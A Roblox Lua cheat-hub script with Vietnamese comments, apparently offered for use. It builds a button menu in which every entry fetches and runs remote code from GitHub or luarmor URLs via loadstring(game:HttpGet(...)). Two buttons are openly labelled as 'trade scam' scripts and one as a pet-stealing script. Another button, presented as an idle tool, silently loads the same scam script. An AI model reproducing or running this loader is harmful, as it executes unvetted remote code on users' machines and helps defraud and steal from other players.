-- Nạp thư viện UI
loadstring(game:HttpGet(("https://raw.githubusercontent.com/daucobonhi/Ui-Redz-V2/refs/heads/main/UiREDzV2.lua")))()

-- 📌 Thêm ảnh nền
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "ThemeBackground"
gui.IgnoreGuiInset = true
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("ImageLabel")
bg.Size = UDim2.new(1, 0, 1, 0)             
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = "rbxassetid://98617642608597"   -- ID ảnh bạn đưa
bg.ZIndex = 0                              
bg.BackgroundTransparency = 1
bg.ScaleType = Enum.ScaleType.Crop
bg.Parent = gui

-- Tiếp tục code gốc
local Window = MakeWindow({
    Hub = {
        Title = "ntp x hub ",
        Animation = "tt :ntp.555"
    },
    Key = {
        KeySystem = false,
        Title = "Key System",
        Description = "",
        KeyLink = "",
        Keys = {"1234"},
        Notifi = {
            Notifications = true,
            CorrectKey = "Running the Script...",
            Incorrectkey = "The key is incorrect",
            CopyKeyLink = "Copied to Clipboard"
        }
    }
})

MinimizeButton({
    Image = "rbxassetid://98617642608597", -- logo có thể đổi
    Size = {60, 60},
    Color = Color3.fromRGB(255, 105, 180),
    Corner = true,
    Stroke = false,
    StrokeColor = Color3.fromRGB(255, 182, 194)
})

-- Các Tab và Button giữ nguyên như trong script gốc...
      
------ Tab
     local Tab1o = MakeTab({Name = "Script blox fruit"})
     local Tab2o = MakeTab({Name = "Script grow a garden"})
     local Tab3o = MakeTab({Name = "Script brainrot"})
     local Tab4o = MakeTab({Name = "Script fix lag"})
------- BUTTON
    
    AddButton(Tab1o, {
     Name = "Redz Hub",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

getgenv().BETA_VERSION = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/heads/main/main.luau"))(Settings)
  end
  })
  
  AddButton(Tab1o, {
     Name = "hoho hub",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

_G.HohoVersion = "v3"
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
  end
  })
  
  AddButton(Tab1o, {
     Name = "W-azure Hub",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/85e904ae1ff30824c1aa007fc7324f8f.lua"))()
  end
  })
  
  AddButton(Tab1o, {
     Name = "min Hub",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingLordVietSub.lua"))()
  end
  })
  
  AddButton(Tab1o, {
     Name = "kai tun",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

getgenv().Mode = "OneClick"
getgenv().Setting = {
["Team"] = "Marines", -- Options "Pirates", "Marines"
["FucusOnLevel"] = true,
["Fruits"] = { -- setting for fruits u want
["Primary"] = { -- if current fruit is not in this list, eat/buy
"Dragon-Dragon",
-- u can configs add mores/remove and must end with , (comma symbol)
},
["Normal"] = { -- it just a normal fruit list
"Dragon-Dragon",
-- u can configs add mores/remove and must end with , (comma symbol)
}
-- run this for get all fruit name `local t={};for _,v in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("GetFruits"))do table.insert(t,`"{v.Name}"`)end;setclipboard(table.concat(t, "\n"))`
},
["IdleCheck"] = 150, -- every (x) seconds if not moving rejoin
};
loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/QuartyzScript/main/Loader.lua"))()
  end
  })
  
  AddButton(Tab2o, {
     Name = "speed hub",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
  end
  })
  
  AddButton(Tab2o, {
     Name = "khnghub script(script trade scam)",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScript-cmd/Khangdz28/refs/heads/main/Khng.Script"))()
  end
  })
  
  AddButton(Tab2o, {
     Name = "no lag",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

repeat wait() until game:IsLoaded() and game.Players.LocalPlayer

local scripts = {
    [126884695634066] = "https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Garden/Garden-V1.lua",
    [81440632616906] = "https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/DigEarth/V1.lua",
}

local url = scripts[game.PlaceId]
if url then
    loadstring(game:HttpGetAsync(url))()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/untitled.lua"))()
end
  end
  })
  
  AddButton(Tab2o, {
     Name = "khnghub script(script trade scam)",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScript-cmd/Khangdz28/refs/heads/main/Khng.Script"))()
  end
  })
  
  AddButton(Tab3o, {
     Name = "cướp pet",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
  end
  })
  
  AddButton(Tab4o, {
     Name = "fix lag turbolite",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
  end
  })
  
AddButton(Tab4o, {
     Name = "QBảo (chỉ treo blox fruit)",
    Callback = function()
	  local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScript-cmd/Khangdz28/refs/heads/main/Khng.Script"))()
  end
  })
  